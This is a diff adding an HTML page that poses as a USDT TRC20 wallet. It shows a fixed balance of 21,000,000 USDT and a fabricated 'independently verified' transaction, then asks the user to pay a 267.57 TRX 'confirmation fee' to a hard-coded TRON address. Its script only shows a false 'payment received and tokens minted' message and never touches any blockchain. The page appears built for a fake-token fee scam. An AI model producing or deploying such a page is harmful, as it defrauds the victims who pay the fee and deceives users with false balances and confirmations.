@@ -1,0 +1,901 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>USDT TRC20(Approve USDT(TRC20)</title>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+
+body{
+ font-family:Arial,Helvetica,sans-serif;
+ background:#07111f;
+ color:white;
+ min-height:100vh;
+}
+
+.app{
+ width:100%;
+ max-width:430px;
+ min-height:100vh;
+ margin:auto;
+ padding:18px;
+ background:#07111f;
+}
+
+.header{margin-bottom:25px}
+.header h1{font-size:21px;font-weight:700}
+
+.card{
+ background:#101d2d;
+ border:1px solid #203247;
+ border-radius:18px;
+ padding:20px;
+ margin-bottom:15px;
+}
+
+.balance-label{
+ color:#91a2b5;
+ font-size:13px;
+ margin-bottom:8px;
+}
+
+.balance{
+ font-size:32px;
+ font-weight:700;
+ letter-spacing:-1px;
+}
+
+.balance span{
+ font-size:15px;
+ color:#aebdce;
+ margin-left:5px;
+}
+
+.token-row{
+ display:flex;
+ align-items:center;
+ gap:12px;
+}
+
+.usdt-logo{
+ width:44px;height:44px;
+ border-radius:50%;
+ background:#26a17b;
+ display:flex;
+ align-items:center;
+ justify-content:center;
+ font-size:20px;
+ font-weight:bold;
+}
+
+.token-name{font-size:16px;font-weight:700}
+.network{color:#8fa2b7;font-size:12px;margin-top:4px}
+
+.label{
+ display:block;
+ color:#a5b5c7;
+ font-size:13px;
+ margin-bottom:8px;
+}
+
+.input-box{margin-bottom:17px}
+
+input{
+ width:100%;
+ height:52px;
+ border-radius:12px;
+ border:1px solid #2b3d52;
+ background:#0a1625;
+ color:white;
+ padding:0 14px;
+ font-size:15px;
+ outline:none;
+}
+
+input:focus{border-color:#26a17b}
+
+.max-btn{
+ float:right;
+ margin-top:-44px;
+ margin-right:8px;
+ position:relative;
+ height:36px;
+ border:0;
+ border-radius:9px;
+ padding:0 12px;
+ background:#19382f;
+ color:#36c997;
+ font-weight:700;
+ cursor:pointer;
+}
+
+.mint-btn,.confirm-pay-btn,.done-btn{
+ width:100%;
+ height:52px;
+ border:0;
+ border-radius:13px;
+ background:#26a17b;
+ color:white;
+ font-size:15px;
+ font-weight:700;
+ cursor:pointer;
+}
+
+.mint-btn{margin-top:3px;height:54px}
+.mint-btn:hover,.confirm-pay-btn:hover,.done-btn:hover{
+ background:#2db589;
+}
+
+.history-title{
+ font-size:15px;
+ font-weight:700;
+ margin-bottom:15px;
+}
+
+.history-item{
+ padding:13px 0;
+ border-bottom:1px solid #203044;
+}
+
+.history-top{
+ display:flex;
+ justify-content:space-between;
+ gap:10px;
+ font-size:13px;
+ margin-bottom:8px;
+}
+
+.history-bottom{
+ color:#7f91a5;
+ font-size:11px;
+ margin-top:5px;
+ line-height:1.7;
+}
+
+.success-text{color:#ffa53e}
+
+.tx-history{
+ background:#0a1625;
+ border:1px solid #263a51;
+ border-radius:12px;
+ padding:13px;
+ margin-top:12px;
+}
+
+.tx-row{
+ padding:11px 0;
+ border-bottom:1px solid #203044;
+}
+
+.tx-row:last-child{border-bottom:0}
+
+.tx-label{
+ color:#8496aa;
+ font-size:11px;
+ margin-bottom:7px;
+ letter-spacing:1px;
+}
+
+.tx-value{
+ color:#dce5f1;
+ font-size:12px;
+ line-height:1.7;
+ word-break:break-all;
+ font-family:Arial,sans-serif;
+}
+
+.copy-small{
+ background:#19304a;
+ color:#8db2ff;
+ border:0;
+ padding:5px 9px;
+ border-radius:6px;
+ font-size:11px;
+ cursor:pointer;
+ margin-top:7px;
+}
+
+.small-note{
+ text-align:center;
+ color:#66788d;
+ font-size:10px;
+ margin-top:18px;
+ padding-bottom:20px;
+}
+
+/* MODALS */
+
+.modal{
+ position:fixed;
+ inset:0;
+ background:rgba(0,0,0,.75);
+ display:none;
+ align-items:flex-end;
+ justify-content:center;
+ z-index:100;
+}
+
+.modal.show{display:flex}
+
+.modal-box{
+ width:100%;
+ max-width:430px;
+ background:#101d2d;
+ border-radius:22px 22px 0 0;
+ padding:22px;
+ border-top:1px solid #2a3c50;
+ max-height:92vh;
+ overflow-y:auto;
+}
+
+.modal-title{
+ font-size:19px;
+ font-weight:700;
+ margin-bottom:18px;
+}
+
+.pay-header{
+ display:flex;
+ align-items:center;
+ justify-content:space-between;
+ margin-bottom:16px;
+}
+
+.pay-close{
+ background:none;
+ border:0;
+ color:#8496aa;
+ font-size:26px;
+ cursor:pointer;
+}
+
+.pay-subtitle{
+ color:#9fb1c5;
+ font-size:13px;
+ margin-bottom:18px;
+ line-height:1.6;
+}
+
+.fee-box{
+ background:#162030;
+ border:1px solid rgba(255,165,62,.3);
+ border-radius:14px;
+ padding:14px 18px;
+ margin-bottom:18px;
+ display:flex;
+ justify-content:space-between;
+ align-items:center;
+ gap:10px;
+}
+
+.fee-label{
+ color:#9fb1c5;
+ font-size:13px;
+ font-weight:600;
+}
+
+.fee-sub{
+ color:#66788d;
+ font-size:11px;
+ margin-top:3px;
+}
+
+.fee-amount{
+ color:#ffa53e;
+ font-weight:700;
+ font-size:19px;
+}
+
+.fee-unit{
+ color:#cc8430;
+ font-size:13px;
+}
+
+.scan-hint{
+ color:#8496aa;
+ font-size:12px;
+ text-align:center;
+ margin-bottom:14px;
+}
+
+.qr-wrap{
+ background:white;
+ border-radius:16px;
+ padding:14px;
+ width:184px;
+ height:184px;
+ margin:0 auto 18px;
+ display:flex;
+ align-items:center;
+ justify-content:center;
+}
+
+.addr-label{
+ color:#8496aa;
+ font-size:11px;
+ margin-bottom:6px;
+}
+
+.addr-box{
+ background:#0a1625;
+ border:1px solid #2b3d52;
+ border-radius:12px;
+ padding:12px 14px;
+ font-size:11px;
+ color:#aebdce;
+ word-break:break-all;
+ line-height:1.7;
+ margin-bottom:10px;
+ font-family:monospace;
+}
+
+.copy-btn{
+ width:100%;
+ height:46px;
+ border:1px solid #26a17b;
+ border-radius:11px;
+ background:transparent;
+ color:#26a17b;
+ font-weight:700;
+ font-size:14px;
+ cursor:pointer;
+ margin-bottom:14px;
+}
+
+.detail{
+ display:flex;
+ justify-content:space-between;
+ gap:15px;
+ padding:11px 0;
+ border-bottom:1px solid #223246;
+ font-size:13px;
+}
+
+.detail span:first-child{
+ color:#8496aa;
+ white-space:nowrap;
+}
+
+.detail span:last-child{
+ text-align:right;
+ word-break:break-all;
+}
+
+.note-text{
+ color:#66788d;
+ font-size:11px;
+ text-align:center;
+ line-height:1.6;
+ margin-top:12px;
+}
+
+.confirm-pay-btn{margin-top:16px}
+
+.success-box{text-align:center}
+
+.success-icon{
+ width:65px;height:65px;
+ border-radius:50%;
+ background:#19382f;
+ color:#39ce9a;
+ display:flex;
+ align-items:center;
+ justify-content:center;
+ margin:0 auto 17px;
+ font-size:32px;
+}
+
+.success-box p{
+ color:#91a2b5;
+ font-size:13px;
+ line-height:1.6;
+}
+
+.done-btn{margin-top:20px}
+</style>
+</head>
+
+<body>
+
+<div class="app">
+
+ <div class="header">
+  <h1> Main Wallet</h1>
+ </div>
+
+ <div class="card">
+  <div class="balance-label">Available balance</div>
+  <div class="balance">
+   <span id="balance">21,000,000.00</span>
+   <span>USDT</span>
+  </div>
+ </div>
+
+ <div class="card">
+  <div class="token-row">
+   <div class="usdt-logo">&#x20AE;</div>
+   <div>
+    <div class="token-name">Tether USD</div>
+    <div class="network">USDT · TRC20 · Tron Network</div>
+   </div>
+  </div>
+ </div>
+
+ <div class="card">
+
+  <label class="label">Amount to Approve</label>
+
+  <div class="input-box">
+   <input type="number" id="amount"
+    placeholder="0.00" min="0" max="21000000" step="0.01">
+   <button class="max-btn" id="maxBtn">MAX</button>
+  </div>
+
+  <label class="label">Recipient TRC20 address</label>
+
+  <div class="input-box">
+   <input type="text" id="address"
+    placeholder="Enter TRC20 address"
+    autocomplete="off" spellcheck="false">
+  </div>
+
+  <button class="mint-btn" id="mintBtn"> Approve USDT</button>
+
+ </div>
+
+ <!-- TRANSACTION HISTORY -->
+
+ <div class="card">
+
+  <div class="history-title">Recent Activity</div>
+
+  <div class="history-item">
+
+   <div class="history-top">
+    <span>Supplied transaction details</span>
+    <span class="success-text"> Verified, Awaiting Approval</span>
+   </div>
+
+   <div class="history-bottom">
+    USDT · TRC20 · Tron Mainnet
+   </div>
+
+   <div class="tx-history">
+
+    <div class="tx-row">
+     <div class="tx-label">FROM ADDRESS</div>
+     <div class="tx-value" id="fromAddress">
+      TQXenb2okynmbidCvsV35Svoxew5GfJG616
+     </div>
+     <button class="copy-small"
+      onclick="copyText('fromAddress')">Copy</button>
+    </div>
+
+    <div class="tx-row">
+     <div class="tx-label">TO ADDRESS</div>
+     <div class="tx-value" id="toAddress">
+      TU5cYEBRMh6ZL1ahQ7qvai45CqpTHZvCA2
+     </div>
+     <button class="copy-small"
+      onclick="copyText('toAddress')">Copy</button>
+    </div>
+
+    <div class="tx-row">
+     <div class="tx-label">ASSET</div>
+     <div class="tx-value">USDT</div>
+    </div>
+
+    <div class="tx-row">
+     <div class="tx-label">NETWORK</div>
+     <div class="tx-value">
+      TRON (TRC20) · Tron Mainnet
+     </div>
+    </div>
+
+    <div class="tx-row">
+     <div class="tx-label">TRANSACTION HASH</div>
+     <div class="tx-value" id="transactionHash">
+      393d7451ce1ba0d78e50de89f54e28bf304d2c33dad6f146a28568c04bddcfd3
+     </div>
+     <button class="copy-small"
+      onclick="copyText('transactionHash')">Copy</button>
+    </div>
+
+    <div class="tx-row">
+     <div class="tx-label">VERIFICATION STATUS</div>
+     <div class="tx-value" style="color:#ffa53e">
+       Details —  Independently verified
+     </div>
+    </div>
+
+   </div>
+
+  </div>
+
+ </div>
+
+ <div class="small-note">
+  USDT TRC20 · Tron Network
+ </div>
+
+</div>
+
+
+<!-- PAYMENT MODAL -->
+
+<div class="modal" id="payModal">
+
+ <div class="modal-box">
+
+  <div class="pay-header">
+   <div class="modal-title" style="margin-bottom:0">
+    Complete Payment
+   </div>
+   <button class="pay-close" id="payClose">&times;</button>
+  </div>
+
+  <p class="pay-subtitle">
+   Review the payment details below. Payment is not confirmed
+   until independently verified on the Tron blockchain.
+  </p>
+
+  <div class="fee-box">
+   <div>
+    <div class="fee-label"> Confirmation Fee</div>
+    <div class="fee-sub">One-time processing fee</div>
+   </div>
+
+   <div>
+    <span class="fee-amount">267.56960366</span>
+    <span class="fee-unit">TRX</span>
+   </div>
+  </div>
+
+  <p class="scan-hint">
+   Scan QR code or copy address below
+  </p>
+
+  <div class="qr-wrap">
+   <div id="qrcode"></div>
+  </div>
+
+  <div class="addr-label">Payment address (TRC20)</div>
+
+  <div class="addr-box" id="payAddr">
+   TNPjwy7BhMhfZdfvDwbhuHud88DQSCL4EH
+  </div>
+
+  <button class="copy-btn" id="copyAddrBtn">
+   Copy Address
+  </button>
+
+  <div class="detail">
+   <span>Network</span>
+   <span>TRC20 / Tron</span>
+  </div>
+
+  <div class="detail">
+   <span>Fee</span>
+   <span style="color:#ffa53e;font-weight:700">
+    267.56960366 TRX
+   </span>
+  </div>
+
+  <div class="detail">
+   <span>Mint amount(Approve Amount)</span>
+   <span id="modalMintAmt">—</span>
+  </div>
+
+  <div class="detail" style="border-bottom:0">
+   <span>Recipient</span>
+   <span id="modalMintAddr">—</span>
+  </div>
+
+  <div class="note-text">
+   Send only after independently checking the payment
+   address and fee. This VERIFY the 
+   incoming of the broadcasted blockchain USDT transaction.
+  </div>
+
+  <button class="confirm-pay-btn" id="confirmPayBtn">
+   Continue to Confirmation
+  </button>
+
+ </div>
+
+</div>
+
+
+<!-- DEMO CONFIRMATION MODAL -->
+
+<div class="modal" id="successModal">
+
+ <div class="modal-box success-box">
+
+  <div class="success-icon">&#10003;</div>
+
+  <div class="modal-title">
+   Request Recorded
+  </div>
+
+  <p>
+   Your request has been recorded locally.
+   This means the payment has been received & the
+   USDT tokens have been minted.
+  </p>
+
+  <br>
+
+  <div class="detail">
+   <span>Amount</span>
+   <span id="successAmount">—</span>
+  </div>
+
+  <div class="detail">
+   <span>Network</span>
+   <span>TRC20 / Tron</span>
+  </div>
+
+  <div class="detail" style="border-bottom:0">
+   <span>Status</span>
+   <span style="color:#ffa53e">Awaiting verification</span>
+  </div>
+
+  <button class="done-btn" id="doneBtn">Done</button>
+
+ </div>
+
+</div>
+
+
+<script>
+
+/* CONFIGURATION */
+
+const RECV_ADDR =
+ "TNPjwy7BhMhfZdfvDwbhuHud88DQSCL4EH";
+
+const MINT_BALANCE = 21000000;
+
+const REFLECTION_FEE = "267.56960366";
+
+/* ELEMENTS */
+
+const amountInput = document.getElementById("amount");
+const addressInput = document.getElementById("address");
+const balanceEl = document.getElementById("balance");
+
+const maxBtn = document.getElementById("maxBtn");
+const mintBtn = document.getElementById("mintBtn");
+
+const payModal = document.getElementById("payModal");
+const payClose = document.getElementById("payClose");
+
+const copyAddrBtn = document.getElementById("copyAddrBtn");
+const confirmPayBtn = document.getElementById("confirmPayBtn");
+
+const modalMintAmt = document.getElementById("modalMintAmt");
+const modalMintAddr = document.getElementById("modalMintAddr");
+
+const successModal = document.getElementById("successModal");
+const successAmount = document.getElementById("successAmount");
+const doneBtn = document.getElementById("doneBtn");
+
+let qrBuilt = false;
+let pendingAmount = 0;
+
+
+/* BALANCE */
+
+let balance = MINT_BALANCE;
+
+function renderBalance(){
+
+ balanceEl.textContent = balance.toLocaleString("en-US",{
+  minimumFractionDigits:2,
+  maximumFractionDigits:2
+ });
+
+}
+
+renderBalance();
+
+
+/* MAX BUTTON */
+
+maxBtn.addEventListener("click",function(){
+
+ amountInput.value = balance.toFixed(2);
+
+});
+
+
+/* OPEN PAYMENT MODAL */
+
+mintBtn.addEventListener("click",function(){
+
+ const amount = parseFloat(amountInput.value);
+ const address = addressInput.value.trim();
+
+ if(!amount || amount <= 0){
+  alert("Please enter a valid amount.");
+  return;
+ }
+
+ if(amount > balance){
+  alert("The amount cannot be greater than your balance.");
+  return;
+ }
+
+ if(!address){
+  alert("Please enter the recipient TRC20 address.");
+  return;
+ }
+
+ if(!/^T[a-zA-Z0-9]{33}$/.test(address)){
+  alert("Please enter a valid TRON address.");
+  return;
+ }
+
+ pendingAmount = amount;
+
+ modalMintAmt.textContent =
+  amount.toLocaleString("en-US",{
+   minimumFractionDigits:2,
+   maximumFractionDigits:2
+  })+" USDT";
+
+ modalMintAddr.textContent =
+  address.slice(0,8)+"..."+address.slice(-6);
+
+
+ /* BUILD QR CODE */
+
+ if(!qrBuilt){
+
+  try{
+
+   new QRCode(document.getElementById("qrcode"),{
+    text:RECV_ADDR,
+    width:156,
+    height:156,
+    colorDark:"#000000",
+    colorLight:"#ffffff",
+    correctLevel:QRCode.CorrectLevel.M
+   });
+
+   qrBuilt = true;
+
+  }catch(e){
+
+   document.getElementById("qrcode").textContent =
+    "QR unavailable. Copy address below.";
+
+  }
+
+ }
+
+ payModal.classList.add("show");
+
+});
+
+
+/* CLOSE PAYMENT MODAL */
+
+payClose.addEventListener("click",function(){
+
+ payModal.classList.remove("show");
+
+});
+
+payModal.addEventListener("click",function(e){
+
+ if(e.target === payModal){
+  payModal.classList.remove("show");
+ }
+
+});
+
+
+/* COPY TEXT */
+
+function copyText(id){
+
+ const element = document.getElementById(id);
+
+ const text = element.textContent.trim();
+
+ if(navigator.clipboard && window.isSecureContext){
+
+  navigator.clipboard.writeText(text)
+   .then(()=>alert("Copied successfully."))
+   .catch(()=>fallbackCopy(text));
+
+ }else{
+
+  fallbackCopy(text);
+
+ }
+
+}
+
+function fallbackCopy(text){
+
+ const textarea = document.createElement("textarea");
+
+ textarea.value = text;
+
+ document.body.appendChild(textarea);
+
+ textarea.select();
+
+ document.execCommand("copy");
+
+ textarea.remove();
+
+ alert("Copied successfully.");
+
+}
+
+
+/* COPY PAYMENT ADDRESS */
+
+copyAddrBtn.addEventListener("click",function(){
+
+ copyText("payAddr");
+
+});
+
+
+/* DEMO CONFIRMATION */
+
+confirmPayBtn.addEventListener("click",function(){
+
+ if(!pendingAmount){
+  alert("No active mint request.");
+  return;
+ }
+
+ successAmount.textContent =
+  pendingAmount.toLocaleString("en-US",{
+   minimumFractionDigits:2,
+   maximumFractionDigits:2
+  })+" USDT";
+
+ payModal.classList.remove("show");
+
+ successModal.classList.add("show");
+
+});
+
+
+/* CLOSE CONFIRMATION */
+
+doneBtn.addEventListener("click",function(){
+
+ successModal.classList.remove("show");
+
+ pendingAmount = 0;
+
+ amountInput.value = "";
+ addressInput.value = "";
+
+});
+
+successModal.addEventListener("click",function(e){
+
+ if(e.target === successModal){
+  successModal.classList.remove("show");
+ }
+
+});
+
+</script>
+
+</body>
+</html>
